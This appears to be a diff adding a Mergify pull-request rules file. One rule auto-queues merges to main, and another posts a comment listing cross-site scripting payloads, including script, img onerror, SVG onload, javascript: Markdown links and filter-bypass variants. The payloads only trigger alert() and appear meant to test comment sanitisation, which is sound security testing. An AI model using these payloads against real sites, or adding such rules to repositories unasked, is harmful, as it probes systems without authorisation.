@@ -1,0 +1,40 @@
+pull_request_rules:
+  - name: automatic queue for testing
+    conditions:
+      - "base=main"
+    actions:
+      queue:
+        name: default
+        method: merge
+
+  - name: comment XSS payloads for testing
+    conditions:
+      - "base=main"
+    actions:
+      comment:
+        message: |
+          🚀 **XSS Testing Bot Activated** 🚀
+
+          **HTML Injection:**
+          <script>alert('XSS-HTML')</script>
+
+          **Image Injection:**
+          <img src=x onerror=alert('XSS-IMG')>
+
+          **Markdown Image Injection:**
+          ![xss](javascript:alert('XSS-Markdown-IMG'))
+
+          **Obfuscated JavaScript:**
+          <img src=x oNerror=alert('XSS-Obfuscated')>
+
+          **Markdown Link Injection:**
+          [XSS-TEST](javascript:alert('XSS-Markdown-Link'))
+
+          **SVG Injection:**
+          <svg/onload=alert('XSS-SVG')>
+
+          **Attribute Injection (mouseover):**
+          <a href="#" onmouseover="alert('XSS-OnMouseOver')">hover me</a>
+
+          **Broken HTML Injection:**
+          <<script>script>alert('XSS-Broken')</</script>script>
